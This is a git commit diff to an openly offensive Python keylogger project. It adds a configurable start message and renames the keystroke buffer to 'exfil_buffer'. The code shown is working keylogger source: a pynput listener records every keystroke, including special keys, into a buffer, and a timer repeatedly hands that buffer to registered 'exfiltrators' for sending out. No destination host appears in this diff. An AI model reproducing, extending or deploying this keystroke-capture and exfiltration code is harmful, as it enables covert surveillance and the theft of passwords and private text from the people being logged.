2c15b4683471ae0822de58a74c9f947eb3f844ec
EONRaider <livewire_voodoo@protonmail.com>
2021-10-10 16:00:56 -0300

    Add 'start_message' parameter to KeyLogger
    The hard-coded value in the initializer of
    KeyLogger was replaced with a default argument
    
    - Modified docstrings
    - Renamed 'data_buffer' instance variable to
    'exfil_buffer' for clarity

--- src/keylogger.py
+++ src/keylogger.py
@@ -10,17 +10,23 @@ from pynput import keyboard
 
 
 class KeyLogger(object):
-    def __init__(self, *, exfil_time: [int, float]):
+    def __init__(self, *,
+                 start_message: str = "Keylogger Initialized",
+                 exfil_time: [int, float]):
         """Set up a keyboard listener that monitors keystroke events
         and send them to pre-configured exfiltration methods.
 
         Args:
+            start_message (str): An initial message that will be sent
+                through all exfiltrators by the keylogger upon
+                activation. Useful as a signal that the service is
+                active.
             exfil_time (int,float): Time in seconds to wait before
                 executing the exfiltration of logged keystrokes.
         """
 
         self.exfil_time = exfil_time
-        self.data_buffer: list[str] = ["Keylogger Initialized"]
+        self.exfil_buffer: list[str] = [start_message]
         self.__exfiltrators = list()
         '''Mapping of key names to string characters for human-readable 
         text output. Add more mappings as necessary depending on the 
@@ -31,13 +37,13 @@ class KeyLogger(object):
     def contents(self) -> str:
         """Get a string representation of the data buffered by the
         keylogger for exfiltration."""
-        return "".join(self.data_buffer)
+        return "".join(self.exfil_buffer)
 
     @property
     def has_data(self) -> bool:
         """Returns True if the keylogger has data ready for exfiltration
         and False otherwise."""
-        return bool(len(self.data_buffer))
+        return bool(len(self.exfil_buffer))
 
     def register_exfiltrator(self, exfiltrator) -> None:
         """Register an instance of a child-class of Exfiltrator as an
@@ -51,11 +57,11 @@ class KeyLogger(object):
         [exfiltrator.update() for exfiltrator in self.__exfiltrators]
         Timer(interval=self.exfil_time,
               function=self._notify_all_exfiltrators).start()
-        self.data_buffer.clear()
+        self.exfil_buffer.clear()
 
     def _on_press(self, key: keyboard.Key) -> None:
-        """Add the string representation of each keystroke captured by
-        the listener thread to the exfiltration buffer."""
+        """Add the string representation of each keystroke captured
+        'on press' by the listener thread to the exfiltration buffer."""
         try:  # A key was pressed and caught by the listener
             pressed_key: str = key.char  # The key is alphanumeric
         except AttributeError:  # The key is special
@@ -66,7 +72,7 @@ class KeyLogger(object):
                     pressed_key = f"[{key.name.upper()}]"
                 except AttributeError:  # ... or is unknown
                     pressed_key = "[???]"
-        self.data_buffer.append(pressed_key)
+        self.exfil_buffer.append(pressed_key)
 
     def _on_release(self, key: keyboard.Key) -> None:
         ...
